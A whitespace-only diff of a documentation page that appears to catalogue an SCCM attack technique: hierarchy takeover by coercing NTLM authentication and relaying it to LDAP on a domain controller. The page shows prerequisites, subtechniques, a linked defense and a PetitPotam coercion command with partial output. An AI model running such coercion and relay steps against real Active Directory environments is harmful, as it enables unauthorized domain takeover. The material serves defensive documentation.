@@ -10,7 +10,7 @@ Hierarchy takeover via NTLM coercion and relay HTTP to LDAP on domain controller
 ### Coercion
 - Valid Active Directory domain credentials
 - Connectivity to SMB (TCP/445) on a coercion target:
-    - TAKEOVER-8.1: Coerce primary site server 
+    - TAKEOVER-8.1: Coerce primary site server
     - TAKEOVER-8.2: Coerce SMS Provider
     - TAKEOVER-8.3: Coerce passive site server
     - TAKEOVER-8.4: Coerce site database server
@@ -61,7 +61,7 @@ The "Full Administrator" security role is granted all permissions in Configurati
 - [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)
 
 ## Subtechniques
-- TAKEOVER-8.1: Coerce primary site server 
+- TAKEOVER-8.1: Coerce primary site server
 - TAKEOVER-8.2: Coerce SMS Provider
 - TAKEOVER-8.3: Coerce passive site server
 - TAKEOVER-8.4: Coerce site database server
@@ -93,7 +93,7 @@ The steps to execute TAKEOVER-8.1 through TAKEOVER-8.4 are mostly the same excep
 
 3. From the attacker host, coerce NTLM authentication from the coercion target via HTTP, targeting the relay server's IP address and the specified port:
     ```
-    # python3 PetitPotam.py -d MAYYHEM.LOCAL -u lowpriv -p <PASSWORD> <NTLMRELAYX_NETBIOSNAME>@8080/a <COERCION_TARGET_IP>            
+    # python3 PetitPotam.py -d MAYYHEM.LOCAL -u lowpriv -p <PASSWORD> <NTLMRELAYX_NETBIOSNAME>@8080/a <COERCION_TARGET_IP>
 
     Trying pipe lsarpc
     [-] Connecting to ncacn_np:192.168.57.50[\PIPE\lsarpc]
